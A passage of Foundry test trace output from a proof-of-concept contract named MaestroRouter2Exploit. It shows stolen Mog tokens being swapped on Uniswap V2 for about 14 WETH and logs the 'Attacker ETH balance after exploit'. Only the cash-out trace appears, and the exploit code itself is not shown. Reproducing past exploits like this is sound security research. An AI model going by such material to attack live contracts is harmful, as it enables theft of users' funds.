    │   ├─ [60434] 0xc2eaB7d33d3cB97692eCB231A5D0e4A649Cb539d::swap(0, 14040863116812856819 [1.404e19], MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [27962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14040863116812856819 [1.404e19])
    │   │   │   ├─ emit Transfer(from: 0xc2eaB7d33d3cB97692eCB231A5D0e4A649Cb539d, to: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 14040863116812856819 [1.404e19])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x8a0869b48cb256b682d977ea9bc491a3e1d479c22ec392a89df1b845f379ccee: 0x000000000000000000000000000000000000000000000010d2e62b92664bd9e0 → 0x000000000000000000000000000000000000000000000010100b00f574c82bed
    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x000000000000000000000000000000000000000000000000c2db2a9cf183adf3
    │   │   │   └─ ← [Return] true
    │   │   ├─ [615] Mog Token::balanceOf(0xc2eaB7d33d3cB97692eCB231A5D0e4A649Cb539d) [staticcall]
    │   │   │   └─ ← [Return] 12462624836175776090539889510053 [1.246e31]
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xc2eaB7d33d3cB97692eCB231A5D0e4A649Cb539d) [staticcall]
    │   │   │   └─ ← [Return] 296303923962929753069 [2.963e20]
    │   │   ├─ emit Sync(reserve0: 12462624836175776090539889510053 [1.246e31], reserve1: 296303923962929753069 [2.963e20])
    │   │   ├─ emit Swap(sender: UniswapRouterV2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 565463522794182597666471533996 [5.654e29], amount1In: 0, amount0Out: 0, amount1Out: 14040863116812856819 [1.404e19], to: MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─  storage changes:
    │   │   │   @ 8: 0x65384a6b000000000010d2e62b92664bd9e0009629cd2ecef0e852d8f341e8f9 → 0x65384aef000000000010100b00f574c82bed009d4ce9a560add3b1547f83c6a5
    │   │   │   @ 9: 0x000000000000000000000000000000000000000a1f2ff9e75e12d102d5e75f28 → 0x000000000000000000000000000000000000000a1f3ec3da8a9db5379606b5ec
    │   │   │   @ 10: 0x0000000000000000000009fda0236e30836f299e5df7225d1dd5de5443781594 → 0x0000000000000000000009fda4bd9d2f8685752e7df7a0bbc508572fb9e35444
    │   │   └─ ← [Stop]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 14040863116812856819 [1.404e19]
    │   └─ ← [Stop]
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(MaestroRouter2Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 14040863116812856819 [1.404e19]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH balance after exploit", val: 14040863116812856819 [1.404e19], decimals: 18)
    ├─  storage changes:
    │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0 → 0x0000000000000000000000000000000000000007231c7691bceb5e7b8c41ddac
    │   @ 0x911a87982733987439e36e2e722f6ea6e865fd905bdac35dc01b229c4f89cd70: 0 → 0x0000000000000000000000000000000000000007231c7691bceb5e7b8c41ddac
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.35s (16.63s CPU time)

Ran 2 test suites in 19.31s (19.08s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
